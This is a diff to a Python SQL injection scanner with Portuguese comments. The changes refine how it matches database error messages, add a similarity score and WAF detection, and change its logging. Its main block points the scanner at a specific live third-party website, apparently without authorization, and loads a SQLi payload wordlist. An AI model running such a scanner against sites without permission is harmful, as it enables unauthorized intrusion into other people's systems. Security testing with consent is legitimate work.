@@ -1,11 +1,12 @@
 import re
-import asyncio
 import random
+import asyncio
+from difflib import SequenceMatcher
 
 import utils
 import jsonlog
-import supplementary
 import HTMLAnalitcs
+import supplementary
 from Request import Request
 from signatures import SQLI_ERRORS, DATABASE_HEADERS
 
@@ -29,7 +30,10 @@ class SQLI:
         self.try_requests = try_requests
         self.verbose = verbose
     
-    # SCORE SQLI SYSTEM
+    # response  -> reecebe resposta bruta
+    async def clean_html(self, response):
+        return re.sub(r'\s+|<[^>]+>', '', response.lower())
+
     # payload   -> carga enviada
     # response  -> resposta bruta da requisicao 
     async def sqli_score_system(self, payload, response):
@@ -43,33 +47,38 @@ class SQLI:
         score += sum(v for v in suspicious.values())
         return score
     
-    # TRABALHAR O RESPONSE_ANALYZER
     # payload   -> carga enviada
     # response  -> resposta bruta da request
-    async def response_analyzer(self, payload, response):
+    async def detect_reflected_sqli(self, payload, response):
         score = 0
-        details = {}
-        banner = ""
+        details = {
+            'database_type': None,
+            'message_error': None,
+            'similarity': 0,
+            'potential_sqli': False,
+            'sqli_score': 0,
+            'waf': None,
+        }
         
         # SCORE SQLI POSSIBILITIES
         score = await self.sqli_score_system(payload, response)
         details['sqli_score'] = score
 
+        # REMOVE DIRT ELEMENTS
+        response_clear = await self.clean_html(response.text)
+
         for k, v in SQLI_ERRORS.items(): # itera sobre o dicionario
             # if any(re.search(error_msg.lower(), response.text.lower()) for error_msg in v): # verifica o tipo de erro no retorno
             for error_msg in v:
-                if re.search(error_msg.lower(), response.text.lower(), re.IGNORECASE | re.DOTALL):
+                similarity = SequenceMatcher(None, error_msg.lower(), response_clear).ratio()
+                if re.search(error_msg.lower(), response.text.lower(), re.IGNORECASE | re.DOTALL) and similarity > 0.90:
                     details['database_type'] = k
                     details['message_error'] = error_msg.lower()
+                    details['similarity'] = f'{similarity*100}%'
                     details['potential_sqli'] = True
-                    
-                    print(f'{" "*3}[>][{utils.time_now()}][{response.status_code}] Possivel vulnerabilidade: {self.target} -> {payload}')
-                    print(f'{" "*3}[>] Tipo: {k} Msg: {error_msg} url: {response.url} Score: {score}')
-                else:
-                    details['potential_sqli'] = False
 
         # WAF DETECTION
-        details['waf'] = await supplementary.waf_detection(response) # verifica a chance de ter waf
+        details['waf'] = await supplementary.test_waf_detection(response) # verifica a chance de ter waf
 
         # BANNER CAPTURE
         banner = response.text if response.status_code in [301, 302, 307] else response.text[:500] # recolhe amostra do http
@@ -83,7 +92,8 @@ class SQLI:
         
         await asyncio.sleep(self.interval)
         
-        print(f'[+][{utils.time_now()}] Tentando: {url}')
+        if self.verbose:
+            print(f'[+][{utils.time_now()}] Tentando: {url} \n{" "*3}[>]Payload: {payload}')
         
         # REQUISICAO
         status, r = Request(url, timeout=self.timeout, SSL=self.SSL, method=method, params=params,
@@ -91,13 +101,17 @@ class SQLI:
                             cookies=self.cookies, ua_status=self.ua_status, redirect=False,
                             try_requests=self.try_requests).request()
         
-        if self.verbose:
-            print(f'{" "*3}[>][{utils.time_now()}] Payload: {payload}')
-        
         if status:
             # ANALYSIS RESPONSE
-            details, score, banner = await self.response_analyzer(payload, r)
-            print(f'[#][{utils.time_now()}][{r.status_code}] Possivel vulnerabilidade: {self.target} -> {payload}')
+            details, score, banner = await self.detect_reflected_sqli(payload, r)
+            if details['potential_sqli']:
+                print(f'[!][{utils.time_now()}][{r.status_code}] Possivel vulnerabilidade: {self.target} -> {payload}')
+                if self.verbose:
+                    print(f'{" "*3}[>] BD Type: {details["database_type"]}')
+                    print(f'{" "*3}[>] Msg: {details["message_error"]}')
+                    print(f'{" "*3}[>] Similarity: {details["similarity"]}')
+                    print(f'{" "*3}[>] Score: {score}')
+                    #print(f'{" "*3}[>] WAF: {details["waf"]}\n')
             
         else:
             print(f'{" "*3}[>][{utils.time_now()}] Falha ao requisitar: {r}')
@@ -188,7 +202,7 @@ class SQLI:
 # MAIN
 async def main():
     scanner = SQLI(
-        target='https://www.socasadas.com/',
+        target='https://www.socasadas.com',
         wordlist_file='wordlists/sqli/default.txt',
         option='forms',
         save_file='xsss_objetct.json',
